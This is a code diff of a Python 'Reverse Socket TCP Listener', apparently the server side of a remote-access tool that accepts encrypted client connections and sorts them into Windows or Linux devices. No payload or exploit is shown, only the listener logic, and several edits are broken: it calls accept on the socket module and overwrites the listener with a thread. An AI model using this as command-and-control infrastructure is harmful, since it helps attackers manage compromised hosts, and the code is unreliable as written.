@@ -1,22 +1,16 @@
-from globals import *
+# Reverse Socket TCP Listener
+from Utils.ui import *
 from Devices import *
-class SOCKET():
-    def __init__(self, address, port):
-        self.connections = []
-        self.address = address
-        self.port = port
-        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+class Listener():
+    def __init__(self, Server, config):
+        self.address = config["address"]
+        self.server = Server
+        self.port = config["port"]
+        #self.ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+        #self.ssl_context.load_cert_chain(certfile="Data/ssl.pem", keyfile="Data/ssl.key")
+        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.stopped = False
         self.start()
-    def get_device(self, id):
-        # Get a connection by id
-        try:
-            id = int(id) - 1
-            return self.connections[id]
-        except ValueError:
-            return Exception("Invalid ID")
-        except IndexError:
-            raise Exception("Connection does not exist")
     def decrypt(self, data):
         # Decrypt the data
         return self.fernet.decrypt(data).decode()
@@ -30,7 +24,7 @@ class SOCKET():
         while True:
             # Check if Server is stopped
             if self.stopped:
-                break
+                exit()
             for Device in self.connections:
                 if not Device.alive():
                     self.connections.remove(Device)
@@ -42,9 +36,10 @@ class SOCKET():
         while True:
             # Check if Server stopped
             if self.stopped:
-                break
+                exit()
             try:
-                conn, addr = self.server.accept()
+                #with self.context.wrap_socket(self.socket, server_side=True) as socket:
+                conn, addr = socket.accept()
             except Exception as e:
                 logging.error(e)
                 exit()
@@ -56,9 +51,9 @@ class SOCKET():
                 conn.send(self.key)
                 operating_system = self.decrypt(conn.recv(1024)).lower()
                 if operating_system == "windows":
-                    self.connections.append(Windows(conn, addr[0], self.key))
+                    self.server.connections.append(Windows(conn, addr[0], self.key))
                 elif operating_system == "linux":
-                    self.connections.append(Linux(conn, addr[0], self.key))
+                    self.server.connections.append(Linux(conn, addr[0], self.key))
                 else:
                     log(f"Unknown Operating System: {operating_system}", alert="error")
                     logging.error(f"Unknown Operating System: {operating_system}")
@@ -66,14 +61,12 @@ class SOCKET():
                     continue
 
     def start(self):
-        self.connections = []
         ADDR = (self.address, self.port)
         try:
-            self.server.bind(ADDR)
+            self.listener.bind(ADDR)
         except:
-            log("Port is already in use.", alert="critical")
-            raise SystemExit
-        self.server.listen()
+            raise Exception("Port is already in use.")
+        self.listener.listen()
         # Start the Listener and Refresher
         self.listener = threading.Thread(target=self.listen, name="Listener")
         self.listener.start()
@@ -82,7 +75,7 @@ class SOCKET():
 
     def stop(self):
         # Stop the Server
-        self.server.shutdown(socket.SHUT_RDWR)
+        self.listener.shutdown(socket.SHUT_RDWR)
         self.stopped = True
     def status(self):
         """Get Status of the Server
